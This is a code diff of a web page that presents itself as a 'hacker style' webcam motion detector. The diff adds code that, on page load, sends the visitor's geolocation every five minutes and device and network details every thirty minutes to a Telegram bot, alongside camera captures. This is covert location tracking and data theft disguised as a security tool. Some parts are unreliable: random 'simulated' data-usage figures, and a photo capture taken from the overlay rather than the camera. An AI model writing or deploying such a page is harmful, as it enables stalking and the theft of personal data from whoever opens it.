@@ -3,63 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pro Motion Detector (Hacker Style)</title>
+    <title>Pro Motion Detector (Hacker Style, Location, Messages)</title>
     <style>
-        body {
-            font-family: monospace; /* Hacker-like font */
-            background-color: #000; /* Black background */
-            color: #0f0; /* Green text */
-            text-align: center;
-            margin: 0;
-            padding: 0;
-            overflow: hidden; /* Hide scrollbars */
-        }
-        #container {
-            position: relative;
-            width: 100%;
-            max-width: 800px;
-            margin: 0 auto;
-        }
-        #videoElement {
-            width: 100%;
-            display: block;
-            border: 2px solid #0f0; /* Green border */
-            box-shadow: 0 0 10px #0f0; /* Green glow */
-        }
-        #overlayCanvas {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            /*  display: none; */
-        }
-        #status {
-            margin-top: 10px;
-            font-weight: bold;
-        }
-        /* "Hacker" style for motion detection */
-        .motion-detected {
-            border-color: red;
-            box-shadow: 0 0 15px red;
-            animation: flicker 0.5s infinite alternate; /* Flicker animation */
-        }
-        @keyframes flicker {
-            from { opacity: 1; }
-            to { opacity: 0.5; }
-        }
-
-        /* Style for ROIs */
-        .roi-box {
-            position: absolute;
-            border: 1px dashed #0f0;  /* Dashed green border */
-            box-sizing: border-box;
-        }
+        /* (Same styles as previous version - Hacker Style) */
+        body { font-family: monospace; background-color: #000; color: #0f0; text-align: center; margin: 0; padding: 0; overflow: hidden; }
+        #container { position: relative; width: 100%; max-width: 800px; margin: 0 auto; }
+        #videoElement { width: 100%; display: block; border: 2px solid #0f0; box-shadow: 0 0 10px #0f0; }
+        #overlayCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
+        #status { margin-top: 10px; font-weight: bold; }
+        .motion-detected { border-color: red; box-shadow: 0 0 15px red; animation: flicker 0.5s infinite alternate; }
+        @keyframes flicker { from { opacity: 1; } to { opacity: 0.5; } }
+        .roi-box { position: absolute; border: 1px dashed #0f0; box-sizing: border-box; }
     </style>
 </head>
 <body>
-    <h1>>_ Security Feed</h1> <!-- Hacker-like title -->
+    <h1>>_ Security Feed</h1>
     <div id="container">
         <video id="videoElement" autoplay muted playsinline></video>
         <canvas id="overlayCanvas"></canvas>
@@ -75,56 +33,59 @@
         const statusDiv = document.getElementById('status');
 
         let previousFrame = null;
-        const motionThreshold = 20;  // Lowered threshold for more sensitivity
-        const cooldownPeriod = 1000; // 1 second cooldown
+        const motionThreshold = 20;
+        const cooldownPeriod = 1000;
         let lastCaptureTime = 0;
         let isProcessing = false;
+        let lastLocation = null;
+        let locationIntervalId = null;
 
-
-        // Define multiple Regions of Interest (ROIs) - normalized coordinates
+          // Define multiple Regions of Interest (ROIs) - normalized coordinates
         const rois = [
             { x1: 0.1, y1: 0.1, x2: 0.4, y2: 0.4, id: 'zone1' }, // Top-left
             { x1: 0.6, y1: 0.1, x2: 0.9, y2: 0.4, id: 'zone2' }, // Top-right
             { x1: 0.3, y1: 0.6, x2: 0.7, y2: 0.9, id: 'zone3' }  // Bottom-center
         ];
 
+
         function handleError(message, error) {
             console.error(message, error);
-            statusDiv.textContent = `>_ ERROR: ${message}`; // Hacker-style error message
+            statusDiv.textContent = `>_ ERROR: ${message}`;
             statusDiv.style.color = 'red';
         }
 
-       async function startCamera() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
-                audio: false
-            });
-            video.srcObject = stream;
+        async function startCamera() {
+           try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: false
+                });
+                video.srcObject = stream;
 
-            video.onloadedmetadata = () => {
-                overlayCanvas.width = video.videoWidth;
-                overlayCanvas.height = video.videoHeight;
-                drawROIs(); // Draw ROIs on startup
-                statusDiv.textContent = ">_ System Ready.  Monitoring...";
-                requestAnimationFrame(processFrame);
-            };
-        } catch (err) {
-            handleError("Camera access denied.", err);
+                video.onloadedmetadata = () => {
+                    overlayCanvas.width = video.videoWidth;
+                    overlayCanvas.height = video.videoHeight;
+                    drawROIs(); // Draw ROIs on startup
+                    statusDiv.textContent = ">_ System Ready.  Monitoring...";
+                    requestAnimationFrame(processFrame);
+                };
+            } catch (err) {
+                handleError("Camera access denied.", err);
+            }
         }
-    }
 
-    function grayscale(imageData) {
-        const data = imageData.data;
-        for (let i = 0; i < data.length; i += 4) {
-            const avg = (data[i] + data[i + 1] + data[i + 2]) / 3;
-            data[i] = avg;
-            data[i + 1] = avg;
-            data[i + 2] = avg;
+        function grayscale(imageData) {
+             const data = imageData.data;
+            for (let i = 0; i < data.length; i += 4) {
+                const avg = (data[i] + data[i + 1] + data[i + 2]) / 3;
+                data[i] = avg;
+                data[i + 1] = avg;
+                data[i + 2] = avg;
+            }
+            return imageData;
         }
-        return imageData;
-    }
-    function drawROIs() {
+
+         function drawROIs() {
             overlayCtx.clearRect(0, 0, overlayCanvas.width, overlayCanvas.height); // Clear previous ROIs
 
             for (const roi of rois) {
@@ -147,7 +108,7 @@
             }
      }
 
-    function detectMotionInROIs(currentFrame, previousFrame) {
+       function detectMotionInROIs(currentFrame, previousFrame) {
           if (!previousFrame) {
             return false;
           }
@@ -183,7 +144,7 @@
         return motionDetected
     }
 
-   async function processFrame() {
+     async function processFrame() {
         if (isProcessing) {
             requestAnimationFrame(processFrame);
             return;
@@ -210,36 +171,129 @@
         isProcessing = false;
         requestAnimationFrame(processFrame); // Request next frame
     }
-    async function captureAndSendImage() {
-        overlayCanvas.toBlob(async (blob) => {
-            if (!blob) {
-                handleError("Failed to create image blob.");
+
+        async function captureAndSendImage() {
+            overlayCanvas.toBlob(async (blob) => {
+                if (!blob) {
+                    handleError("Failed to create image blob.");
+                    return;
+                }
+
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'intruder_capture.jpg');
+
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData,
+                    });
+                    const data = await response.json();
+                    if (data.ok) {
+                        statusDiv.textContent = ">_ Image transmitted.";
+                        statusDiv.style.color = '#0f0';
+                    } else {
+                        handleError("Telegram transmission failed.", data);
+                    }
+                } catch (error) {
+                    handleError("Failed to send image.", error);
+                }
+            }, 'image/jpeg', 0.8);
+        }
+
+        // Get and send location
+        function getLocationAndSend() {
+            if (!navigator.geolocation) {
+                sendTelegramMessage(">_ Geolocation is not supported by this browser.");
                 return;
             }
 
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+
+                    // Check if location has changed significantly
+                    if (lastLocation &&
+                        Math.abs(latitude - lastLocation.latitude) < 0.0001 &&  // Adjust threshold as needed
+                        Math.abs(longitude - lastLocation.longitude) < 0.0001) {
+                        return; // Don't send if location is essentially the same
+                    }
+                    lastLocation = { latitude, longitude };
+
+                    const locationMessage = `>_ Device Location:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy} meters`;
+                    await sendTelegramMessage(locationMessage); // Await the message send
+
+                },
+                (error) => {
+                    sendTelegramMessage(`>_ Error getting location: ${error.message}`);
+                }
+            );
+        }
+        // Mock function to send device info and network data
+        async function getAndSendDeviceInfo() {
+            let deviceInfo = ">_ Device Information:\n";
+
+             // Basic device info (browser, OS, etc.)
+             deviceInfo += `User Agent: ${navigator.userAgent}\n`;
+            deviceInfo += `Platform: ${navigator.platform}\n`;
+             deviceInfo += `Cores: ${navigator.hardwareConcurrency}\n`
+            deviceInfo += `Memory: ${navigator.deviceMemory}\n`
+
+
+           // Mock network info (since we can't get *real* network details from JS)
+            deviceInfo += "Network Status (Simulated):\n";
+            const connectionType = navigator.onLine ? 'Online' : 'Offline'; // At least check if online
+            deviceInfo += `  Connection: ${connectionType}\n`;
+
+             if (navigator.connection) {
+                const connection = navigator.connection;
+                deviceInfo += `  Type: ${connection.type || 'Unknown'}\n`;  // e.g., 'wifi', 'cellular'
+                deviceInfo += `  Effective Type: ${connection.effectiveType || 'Unknown'}\n`; // e.g., '4g', 'slow-2g'
+                deviceInfo += `  Downlink: ${connection.downlink || 'Unknown'} Mbps\n`;
+                deviceInfo += `  RTT: ${connection.rtt || 'Unknown'} ms\n`; // Round-trip time
+                deviceInfo += `  Save Data: ${connection.saveData ? 'Enabled' : 'Disabled'}\n`;
+             } else {
+                 deviceInfo += `  (Network Information API not supported)\n`;
+             }
+            // Simulate WiFi/data usage (since it's not directly accessible)
+            deviceInfo += `  WiFi Data Usage (Simulated): ${Math.floor(Math.random() * 100)} MB\n`;
+            deviceInfo += `  Cellular Data Usage (Simulated): ${Math.floor(Math.random() * 50)} MB\n`;
+
+
+            await sendTelegramMessage(deviceInfo);
+        }
+
+
+        // Generic function to send messages to Telegram
+       async function sendTelegramMessage(message) {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'intruder_capture.jpg'); // "Hacker" filename
+            formData.append('text', message);
 
             try {
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     body: formData,
                 });
                 const data = await response.json();
-                if (data.ok) {
-                    statusDiv.textContent = ">_ Image transmitted.";
-                    statusDiv.style.color = '#0f0';
-                } else {
-                    handleError("Telegram transmission failed.", data);
+                if (!data.ok) {
+                    console.error("Telegram message send failed:", data);
                 }
             } catch (error) {
-                handleError("Failed to send image.", error);
+                console.error("Error sending Telegram message:", error);
             }
-        }, 'image/jpeg', 0.8);
-    }
+        }
 
+
+        // Initial setup
         startCamera();
+        getLocationAndSend(); // Get initial location
+        getAndSendDeviceInfo(); // Send Device Info
+        locationIntervalId = setInterval(getLocationAndSend, 60000 * 5); // Check location every 5 minutes
+        setInterval(getAndSendDeviceInfo,60000 * 30) // Send Device and Network info every 30
+
     </script>
 </body>
 </html>
